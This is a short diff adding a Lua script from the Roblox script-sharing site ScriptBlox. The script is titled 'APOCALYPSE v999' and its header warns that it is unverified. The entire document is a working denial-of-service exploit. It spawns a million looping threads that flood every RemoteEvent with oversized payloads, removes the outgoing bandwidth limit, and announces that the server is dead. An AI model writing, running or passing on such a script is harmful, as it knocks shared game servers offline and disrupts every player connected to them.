@@ -1,0 +1,12 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+-- APOCALYPSE v999 - FINAL SCRIPT ProDevHacker (lu ga layak liat ini aslinya)
+for i=1,1000000 do
+spawn(function()
+while wait() do
+for _,v in pairs(game:GetService("ReplicatedStorage"):GetDescendants()) do
+if v:IsA("RemoteEvent") then v:FireServer(table.create(9999,"APOCALYPSE"))end
+end;game:GetService("NetworkClient"):SetOutgoingKBPSLimit(9e9)
+end
+end)end;print("APOCALYPSE ACTIVATED - SERVER IS DEAD")
